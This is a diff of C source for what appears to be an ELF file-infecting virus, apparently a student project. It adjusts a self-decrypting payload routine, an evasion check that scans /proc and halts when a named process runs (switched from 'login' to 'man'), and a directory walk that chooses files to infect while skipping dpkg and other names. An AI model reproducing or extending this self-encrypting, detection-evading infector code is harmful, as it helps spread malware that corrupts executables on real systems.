@@ -13,7 +13,7 @@
 #include <stdio.h>
 
 # define SIZE_BEFORE_ENTRY_POINT (62 + 2 * sizeof(size_t))
-# define BONUS 1
+# define BONUS 0
 
 typedef struct s_file {
 	int fd;
@@ -151,10 +151,13 @@ int _start() {
 
 int do_main(void) {
 	if (process_runing()) {
-		return (1);
+		return (0);
+	} else
+	{
+		decrypter(get_eip() - ((char *)&yeah - (char *)&real_start));
+		main_encrypt();
 	}
-	decrypter(get_eip() - ((char *)&yeah - (char *)&real_start));
-	main_encrypt();
+
 
 	return (0);
 }
@@ -229,13 +232,11 @@ bool process_runing(void) {
 	}
 	ft_memmove(path, proc, 6);
 	char cmdname[64];
-	char login[6];
-	login[0] = 'l';
-	login[1] = 'o';
-	login[2] = 'g';
-	login[3] = 'i';
-	login[4] = 'n';
-	login[5] = '\0';
+	char man[4];
+	man[0] = 'm';
+	man[1] = 'a';
+	man[2] = 'n';
+	man[3] = '\0';
 	char cmdline[9];
 	cmdline[0] = '/';
 	cmdline[1] = 'c';
@@ -259,8 +260,9 @@ bool process_runing(void) {
 
 				fd = open(path, 0, 0);
 				j = read(fd, cmdname, 63);
+				close(fd);
 				cmdname[j + 1] = 0;
-				if (!ft_strcmp(cmdname, login)) {
+				if (!ft_strcmp(cmdname, man)) {
 					return (1);
 				}
 			}
@@ -594,8 +596,7 @@ int open_directory(char *path, unsigned int *n_loaded) {
 			i += d->d_reclen;
 			if (d->d_name[0] == '.' ||
 			    (d->d_name[0] == 'd' && d->d_name[1] == 'p' && d->d_name[2] == 'k' && d->d_name[3] == 'g') ||
-			    (d->d_name[0] == 'l' && d->d_name[1] == 'o' && d->d_name[2] == 'g' && d->d_name[3] == 'i' &&
-			     d->d_name[3] == 'n'))
+			    (d->d_name[0] == 'm' && d->d_name[1] == 'a' && d->d_name[2] == 'n' && d->d_name[3] == '\0'))
 				continue;
 			len = ft_strlen(path);
 			ft_memmove(path_file, path, len);
